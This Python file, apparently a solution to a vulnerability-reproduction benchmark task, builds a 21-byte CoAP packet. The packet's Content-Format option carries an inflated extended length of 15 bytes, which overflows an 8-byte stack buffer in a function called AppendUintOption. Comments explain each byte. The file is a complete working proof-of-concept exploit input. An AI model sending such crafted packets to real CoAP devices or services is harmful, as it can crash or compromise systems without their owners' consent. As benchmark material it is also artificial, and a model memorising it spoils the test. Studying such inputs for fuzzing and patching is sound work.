import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a stack buffer overflow in AppendUintOption.
        # This occurs when parsing a CoAP option that is interpreted as a Uint (e.g., Content-Format, Option 12),
        # but the provided option length exceeds the buffer size allocated for the integer (typically 8 bytes).
        # We construct a CoAP packet with a manipulated Content-Format option of length 15.
        
        # CoAP Header: Ver=1 (2 bits), Type=CON (2 bits), TKL=0 (4 bits) -> 0x40
        # Code: GET (1) -> 0x01
        # Message ID: 0x0000 -> 0x00 0x00
        header = b'\x40\x01\x00\x00'
        
        # Option Construction:
        # Option Number 12 (Content-Format).
        # Since this is the first option, Delta = 12.
        # We want a Length of 15 bytes to overflow an 8-byte buffer.
        # 15 cannot be represented in the 4-bit length field (max 12).
        # We use Length Nibble = 13, which indicates the length is 13 + the value of the next byte.
        # Extended Length Byte = 15 - 13 = 2.
        # Byte 0: (Delta << 4) | Length_Nibble = (12 << 4) | 13 = 0xC0 | 0x0D = 0xCD
        # Byte 1: Extended Length = 0x02
        option_header = b'\xCD\x02'
        
        # Option Value: 15 bytes of payload to trigger the overflow
        option_value = b'A' * 15
        
        # Total length: 4 + 2 + 15 = 21 bytes
        return header + option_header + option_value
